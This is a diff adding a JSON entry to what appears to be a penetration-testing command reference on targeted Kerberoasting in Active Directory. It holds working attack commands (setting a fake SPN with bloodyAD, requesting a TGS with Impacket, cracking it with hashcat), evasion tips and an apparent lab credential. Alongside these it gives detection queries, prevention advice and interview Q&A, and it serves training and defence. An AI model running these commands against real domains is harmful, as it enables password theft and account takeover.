@@ -1,0 +1,103 @@
+{
+  "id": "ad-targeted-kerberoast",
+  "name": "Targeted Kerberoasting (Set SPN, Roast, Cleanup)",
+  "command": "targetedKerberoast.py -d <domain> -u <user> -p <password> --request-user <target_account>",
+  "description": "With GenericWrite / GenericAll over a user that has no SPN, temporarily set a fake servicePrincipalName, request a TGS for it (Kerberoast), crack the RC4 hash offline, then remove the SPN. Turns a write ACL over a user into that user's cleartext password.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB Fluffy engagement; targetedKerberoast",
+  "tags": [
+    "kerberoasting",
+    "targeted-kerberoast",
+    "spn",
+    "genericwrite",
+    "acl-abuse",
+    "offline-cracking"
+  ],
+  "mitre": [
+    "T1558.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nKerberoasting normally needs the target to already have an SPN. If you have\nGenericWrite/GenericAll over a user WITHOUT an SPN, you can add one yourself, roast,\nthen delete it - hence 'targeted'.\n\n=== AUTOMATED (targetedKerberoast.py does all of it) ===\n  targetedKerberoast.py -d <domain> -u <user> -p <password> --request-user <target_account>\n  # sets a temp SPN, requests the TGS, prints the $krb5tgs$ hash, removes the SPN.\n\n=== MANUAL ===\n  1. Set SPN:   bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> set object <target_account> servicePrincipalName -v 'fake/svc'\n  2. Roast:     GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip> -request-user <target_account> -outputfile tgs.txt\n  3. Crack:     hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt\n  4. Cleanup:   bloodyAD ... set object <target_account> servicePrincipalName -v   # (clear it)\n\n=== CLEANUP MATTERS ===\nLeaving a bogus SPN behind is an obvious IOC. Always remove it.",
+  "examples": [
+    {
+      "label": "Automated targeted kerberoast",
+      "command": "targetedKerberoast.py -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --request-user p.agila"
+    },
+    {
+      "label": "Manual - set a fake SPN",
+      "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> set object <target_account> servicePrincipalName -v 'fake/svc'"
+    },
+    {
+      "label": "Crack the TGS (hashcat 13100)",
+      "command": "hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt"
+    }
+  ],
+  "references": [
+    {
+      "title": "targetedKerberoast",
+      "url": "https://github.com/ShutdownRepo/targetedKerberoast"
+    },
+    {
+      "title": "The Hacker Recipes - Kerberoast",
+      "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-genericall-group",
+      "note": "GenericWrite/GenericAll over the user is the prerequisite edge.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-shadow-credentials",
+      "note": "If the hash will not crack, Shadow Credentials takes the account outright.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The attacker's write access lets them add a servicePrincipalName to the target, which makes the account Kerberoastable; the DC then issues an RC4 TGS encrypted with the target's password hash, crackable offline. The SPN is removed afterward.",
+    "prerequisites": "GenericWrite/GenericAll (or WriteProperty servicePrincipalName) over a user account, and an offline cracking rig.",
+    "impact": "Recovery of the target user's cleartext password (if crackable).",
+    "detection": "[MITRE T1558.003] Event 5136 adding/removing servicePrincipalName on a user (an add quickly followed by a remove is a strong signal); Event 4769 (TGS request) with RC4 (0x17) encryption for that account shortly after the SPN is set.",
+    "artifacts": "5136 SPN add/remove pair on a user object; 4769 RC4 TGS request; the extracted $krb5tgs$ hash.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=5136 AttributeLDAPDisplayName=\"servicePrincipalName\"\n| table _time, SubjectUserName, ObjectDN, OperationType, AttributeValue\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4769 Ticket_Encryption_Type=0x17\n| table _time, Account_Name, Service_Name, Client_Address",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"servicePrincipalName\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136 and AttributeLDAPDisplayName == \"servicePrincipalName\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType\n| join kind=leftouter (\n    SecurityEvent | where EventID == 4769 and TicketEncryptionType == \"0x17\"\n    | project RoastTime=TimeGenerated, ServiceName, IpAddress\n) on $left.Target == $right.ServiceName\n| sort by TimeGenerated desc",
+    "sigma_rules": "win_security_spn_added_to_user_account, win_security_kerberoasting_rc4",
+    "prevention": "Minimize GenericWrite/GenericAll over users; alert on servicePrincipalName modifications (5136), especially add-then-remove; use AES-only accounts and long (25+ char) passwords for any SPN-bearing account; monitor 4769 RC4 requests.",
+    "evasion": "Remove the SPN immediately after roasting; request a single TGS to limit 4769 noise.",
+    "sources": [
+      "HTB Fluffy",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "Non-administrative principals hold write access to user objects' servicePrincipalName attribute (via GenericWrite/GenericAll or explicit WriteProperty).",
+    "vulnerable_config": "# BloodHound: GenericWrite/GenericAll edge to a user with no SPN.\nGet-DomainObjectAcl -Identity <target_account> -ResolveGUIDs |\n  ? { $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteProperty' }",
+    "secure_config": "# Remove the excessive write ACE (example with dsacls):\ndsacls \"CN=<target_account>,OU=Users,DC=<domain>\" /R \"<domain>\\<over_privileged_principal>\"\n# Alert on Event 5136 servicePrincipalName changes on user objects."
+  },
+  "tools": [
+    "targetedKerberoast",
+    "bloodyAD",
+    "impacket"
+  ],
+  "interview": [
+    {
+      "q": "How does targeted Kerberoasting differ from regular Kerberoasting?",
+      "a": "Regular Kerberoasting roasts accounts that already have an SPN. Targeted Kerberoasting uses GenericWrite/GenericAll over a user with no SPN: you add a temporary SPN, request the TGS, crack it offline, then remove the SPN - turning a write ACL into the user's password.",
+      "role": "both"
+    },
+    {
+      "q": "What is the highest-signal detection for it?",
+      "a": "Event 5136 adding a servicePrincipalName to a user account quickly followed by removing it, correlated with a 4769 RC4 TGS request for that account. The transient SPN add/remove around a roast is a strong, low-false-positive indicator.",
+      "role": "soc"
+    }
+  ]
+}
